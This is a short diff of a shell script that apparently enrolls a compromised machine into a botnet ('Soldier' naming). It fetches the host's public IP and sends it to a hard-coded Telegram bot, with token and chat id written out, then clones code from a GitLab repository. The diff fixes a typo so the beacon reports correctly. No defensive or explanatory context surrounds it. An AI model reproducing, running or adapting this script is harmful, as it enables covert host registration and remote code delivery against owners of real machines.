@@ -4,7 +4,7 @@ apt-get install jq -y
 
 numb=$(echo $(shuf -i 100-500 -n 1))
 myIp="$(wget -qO- ifconfig.me/ip)"
-n0z="Soldier&numb|$myIp"
+n0z="Soldier$numb|$myIp"
 curl --silent -X GET 'https://api.telegram.org/bot1936519764:AAFhpKRoPybd6q1Kqqb-iWFxjdxKlfX3q_0/sendMessage?chat_id=1335828890&text='$n0z --compressed
 
 git clone https://gitlab.com/diablostrom5/master.git
